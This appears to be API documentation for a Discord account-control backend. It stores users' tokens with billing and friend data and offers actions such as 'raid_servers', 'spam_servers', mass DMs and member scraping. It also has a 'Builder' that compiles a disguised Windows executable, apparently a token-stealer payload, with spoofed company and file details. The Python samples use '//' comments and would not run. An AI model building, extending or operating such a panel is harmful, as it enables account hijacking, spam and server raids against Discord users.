# 🚀 Backend API Documentation

Welcome to **Backend API** — a powerful system for managing accounts, relationships, guild interactions, and building executables.

---

## � **Base Overview**

This API provides endpoints to:

* Manage user accounts 🧑‍💻
* Perform automated actions ⚙️
* Handle relationships 💬
* Interact with guilds 🏠
* Clean tokens 🧹
* Compile & download executables 🛠️

---

## � **Endpoints**

### 📂 **Accounts**

Manage and control user accounts.

#### 📋 Get All Accounts
```http
GET /accounts
Authorization: Bearer YOUR_TOKEN_HERE
```

➡️ **Description:** Fetch a list of all accounts

**Response:**
```json
[
  {
    "id": "123456789012345678",
    "username": "example_user",
    "avatar": "https://cdn.discordapp.com/avatars/123456789012345678/abc123def.png",
    "token": "TOKEN_HERE",
    "valid": true,
    "billing_json": {...},
    "friends_json": [...],
    "guilds_json": [...],
    "nitro": true,
    "status": "active"
  }
]
```

#### ➕ Add New Account
```http
POST /add_account
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "token": "NEW_DISCORD_TOKEN_HERE"
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Account added successfully"
}
```

#### 🗑️ Remove Account
```http
DELETE /remove/{id}
Authorization: Bearer YOUR_TOKEN_HERE
```

**Response:**
```json
{
  "status": "success",
  "message": "Account removed successfully"
}
```

#### 🔄 Refresh Account
```http
POST /refresh/{user_id}
Authorization: Bearer YOUR_TOKEN_HERE
```

**Response:**
```json
{
  "status": "success",
  "message": "Account refreshed successfully"
}
```

---

### ⚡ **Actions**

Execute actions on specific accounts.

#### 🎯 Perform Action
```http
POST /action/{user_id}
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "action": "clear_billing",
  "value": "true"
}
```

**Available Actions:**
- `clear_billing` - Clear billing information
- `clear_friends` - Remove all friends
- `clear_guilds` - Leave all guilds
- `set_status` - Change account status
- `spam_servers` - Join spam servers
- `raid_servers` - Raid servers

**Response:**
```json
{
  "status": "success",
  "message": "Action completed successfully"
}
```

---

### � **Relationships**

Control interactions between users.

#### 🚫 Block User
```http
POST /relationships/{user_id}/block/{target_id}
Authorization: Bearer YOUR_TOKEN_HERE
```

**Response:**
```json
{
  "status": "success",
  "message": "Target blocked successfully"
}
```

#### 📩 Send Direct Message
```http
POST /relationships/{user_id}/dm/{target_id}
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "message": "Hello there!"
}
```

#### 📢 Send Mass DM
```http
POST /relationships/{user_id}/dm_all
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "message": "Mass message content"
}
```

---

### � **Guilds**

Join or leave guilds (servers).

#### 🔗 Join Guild
```http
POST /guilds/{user_id}/join
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "invite_link": "https://discord.gg/abc123"
}
```

#### 🚪 Leave Guild
```http
POST /guilds/{user_id}/leave/{guild_id}
Authorization: Bearer YOUR_TOKEN_HERE
```

**Response:**
```json
{
  "status": "success",
  "message": "Left guild successfully"
}
```

#### 🔍 Scrape Guild Members
```http
GET /guilds/{user_id}/scrape/{guild_id}
Authorization: Bearer YOUR_TOKEN_HERE
```

**Response:**
```json
{
  "status": "scraped",
  "count": 1247
}
```

---

### 🧹 **Token Cleaner**

Clean and secure account tokens.

#### 🧹 Start Cleaner
```http
POST /cleaner/{user_id}
Authorization: Bearer YOUR_TOKEN_HERE
```

**Response:**
```json
{
  "status": "started",
  "message": "Cleaner task started"
}
```

---

### �️ **Builder**

Compile and download executables.

#### ⚙️ Compile Executable
```http
POST /builder/compile
Content-Type: application/json
Authorization: Bearer YOUR_TOKEN_HERE

{
  "assembly_info": {
    "company_name": "My Company",
    "file_description": "My Application",
    "file_version": "1.0.0",
    "internal_name": "myapp",
    "legal_copyright": "Copyright 2024 My Company",
    "original_filename": "myapp.exe",
    "product_name": "My Application",
    "product_version": "1.0.0"
  },
  "icon_data": "base64_encoded_icon_data"
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Compilation successful"
}
```

#### 📥 Download Executable
```http
GET /builder/download
Authorization: Bearer YOUR_TOKEN_HERE
```

**Response:**
Binary file download (application/octet-stream)

---

## 📝 **Examples**

### 🌐 JavaScript/TypeScript

#### 🧑 Add Account with Fetch
```javascript
const addAccount = async (token) => {
  try {
    const response = await fetch('http://localhost:8000/add_account', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      },
      body: JSON.stringify({ token })
    });
    
    const result = await response.json();
    console.log('✅ Status:', result.status);
    console.log('📝 Message:', result.message);
  } catch (error) {
    console.error('❌ Error:', error);
  }
};

// Usage
addAccount('YOUR_DISCORD_TOKEN');
```

#### 📊 Get Accounts with Error Handling
```javascript
const getAccounts = async () => {
  try {
    const response = await fetch('http://localhost:8000/accounts', {
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    const accounts = await response.json();
    
    accounts.forEach((account, index) => {
      console.log(`👤 Account ${index + 1}:`);
      console.log(`  📝 ID: ${account.id}`);
      console.log(`  👤 Username: ${account.username}`);
      console.log(`  ✅ Valid: ${account.valid ? 'Yes' : 'No'}`);
      console.log('---');
    });
    
    return accounts;
  } catch (error) {
    console.error('❌ Fetch Error:', error);
    return [];
  }
};

// Usage
getAccounts().then(accounts => {
  console.log(`📊 Found ${accounts.length} accounts`);
}).catch(error => {
  console.error('❌ Connection Error:', error);
});
```

### 🐍 Python Examples

#### 🧑 Add Account with Validation
```python
import requests
import json

def add_account(token):
  url = "http://localhost:8000/add_account"
  headers = {
    "Content-Type": "application/json",
    "Authorization": f"Bearer {token}"
  }
  
  payload = {"token": token}
  
  try:
    response = requests.post(url, json=payload, headers=headers)
    result = response.json()
    
    if result["status"] == "success":
      print("✅ Account added successfully!")
    else:
      print(f"❌ Error: {result.get('message')}")
      
  except requests.exceptions.ConnectionError:
    print("❌ Error: Could not connect to server")
  except Exception as e:
    print(f"❌ Unexpected error: {e}")

// Usage
if __name__ == "__main__":
  token = input("🔑 Enter Discord token: ")
  add_account(token)
```

#### 📊 Get All Accounts with Formatting
```python
import requests
import json

def get_all_accounts():
  """Get all accounts with pretty formatting"""
  try:
    response = requests.get("http://localhost:8000/accounts")
    accounts = response.json()
    
    print(f"📊 Found {len(accounts)} accounts:\n")
    
    for i, account in enumerate(accounts, 1):
      status_emoji = "✅" if account["valid"] else "❌"
      print(f"{i}. 👤 {account['username']}")
      print(f"   📝 ID: {account['id']}")
      print(f"   {status_emoji} Valid: {account['valid']}")
      print("   ---")
      
  except requests.exceptions.ConnectionError:
    print("❌ Error: Could not connect to server")
  except Exception as e:
    print(f"❌ Unexpected error: {e}")

// Usage
if __name__ == "__main__":
  get_all_accounts()
```

### 🌐 cURL Examples

#### 🧑 Basic Authentication Request
```bash
curl -X GET "http://localhost:8000/accounts" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -H "Content-Type: application/json"
```

#### ➕ Add Account with JSON Payload
```bash
curl -X POST "http://localhost:8000/add_account" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -d '{
    "token": "NEW_DISCORD_TOKEN_HERE"
  }' \
  | jq '.'
```

#### 📥 Upload Icon for Compilation
```bash
curl -X POST "http://localhost:8000/builder/compile" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -F "assembly_info={\"company_name\": \"My Company\", \"file_description\": \"My App\"}" \
  -F "icon_data=@/path/to/your/icon.ico"
```

#### 📥 Download Compiled Executable
```bash
curl -X GET "http://localhost:8000/builder/download" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -o "my-compiled-app.exe" \
  --progress-bar
```

---

## 🔒 Security

### 🛡️ Token Validation
The API automatically validates Discord tokens by:
1. ✅ Checking token format (length, characters)
2. 🔍 Making test request to Discord API
3. 📊 Updating account validity status
4. 🔄 Refreshing user data periodically

### 🔐 Data Protection
- **Local Storage**: All data stored in encrypted local SQLite database
- **No External Logging**: Tokens are never logged to external services
- **HTTPS Required**: All webhook communications use HTTPS
- **Input Sanitization**: All inputs are validated and sanitized
- **SQL Injection Protection**: Parameterized queries used throughout

### 🎯 Best Practices
- **Environment Variables**: Store sensitive data in `.env` files
- **Regular Rotation**: Change tokens periodically for security
- **Access Control**: Implement proper authentication for API access
- **Monitoring**: Log all API access and modifications

---

## 🚀 Deployment

### 🐳 Production Setup
```bash
# Environment variables
export DATABASE_URL="sqlite:///accounts.db"
export HOST="0.0.0.0"
export PORT="8000"

# Run with Gunicorn (production)
pip install gunicorn
gunicorn -w 4 -b 0.0.0.0:8000 main:app

# Run with Uvicorn (development)
uvicorn main:app --host 0.0.0.0 --port 8000
```

### 🐳 Docker Setup
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install -r requirements.txt

COPY . .

EXPOSE 8000

CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

```yaml
# docker-compose.yml
version: '3.8'

services:
  discord-manager:
    build: .
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=sqlite:///accounts.db
```

---

## 📞 Support

### 🆘 Getting Help
- **API Issues**: Check the error responses and status codes
- **Compilation Problems**: Verify g++ installation and C++ syntax
- **Database Issues**: Check file permissions and disk space
- **Network Problems**: Verify firewall settings and proxy configuration

### 🐛 Debug Mode
Enable debug logging by setting environment variable:

```bash
export DEBUG=true
python main.py
```

### 🌐 Community Resources
- **GitHub Issues**: Report bugs and feature requests
- **Documentation**: Check this API documentation
- **Examples**: See the examples section above

---

**📅 Last Updated**: January 2024  
**🔢 API Version**: v1.0.0  
**🌐 Base URL**: `http://localhost:8000`

For the most up-to-date information, check the `/health` endpoint or refer to the version history above.

---

> Made with ❤️ by [beepdev](https://github.com/beepdev)
